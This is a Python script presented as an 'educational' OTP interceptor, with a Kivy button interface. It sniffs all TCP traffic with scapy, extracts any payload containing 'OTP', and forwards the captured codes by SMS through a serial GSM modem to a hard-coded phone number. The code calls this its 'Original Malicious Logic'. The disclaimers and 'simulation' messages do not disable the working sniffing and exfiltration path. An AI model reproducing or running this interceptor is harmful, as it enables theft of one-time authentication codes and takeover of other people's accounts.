# =====================================================
# OTP Interceptor (Educational Purpose Only)
# Do NOT use in real life. Malicious if misused.
# =====================================================

import os
import time
from scapy.all import sniff, TCP, Raw
import serial
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label

# Educational warning message
WARNING_MESSAGE = "⚠️ Educational Use Only! OTP interception is malicious. Do NOT use in real life."

# =========================
# Original Malicious Logic
# =========================

# Function to send SMS via a hardware modem
def send_sms_via_modem(phone_number, message):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=1)
        time.sleep(1)
        ser.write(b'AT\r')
        time.sleep(1)
        ser.write(b'AT+CMGF=1\r')
        time.sleep(1)
        ser.write(f'AT+CMGS="{phone_number}"\r'.encode())
        time.sleep(1)
        ser.write(f'{message}\x1A'.encode())
        ser.close()
        print(f"Sent SMS to {phone_number}: {message}")
    except Exception as e:
        print(f"[Simulation] SMS sending skipped: {e}")

# Function to start OTP interception
def intercept_otp():
    def packet_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load
            if b'OTP' in payload:
                otp = payload.decode('utf-8', errors='ignore')
                print(f"Captured OTP: {otp}")
                send_sms_via_modem('7385758928', f"Captured OTP: {otp}")

    print("[Simulation] Starting packet sniffing (won't run in Colab)...")
    try:
        sniff(filter="tcp", prn=packet_callback, store=False)
    except Exception as e:
        print(f"[Simulation] Packet sniffing skipped: {e}")

# =========================
# Kivy UI App
# =========================

class OTPInterceptorApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        warning = Label(text=WARNING_MESSAGE, size_hint=(1, 0.2))
        self.status = Label(text="Press the button to start OTP interception.")
        button = Button(text='Start OTP Interception')
        button.bind(on_press=self.start_interception)
        layout.add_widget(warning)
        layout.add_widget(self.status)
        layout.add_widget(button)
        return layout

    def start_interception(self, instance):
        self.status.text = "Intercepting... (simulation in Colab)"
        intercept_otp()

if __name__ == "__main__":
    OTPInterceptorApp().run()
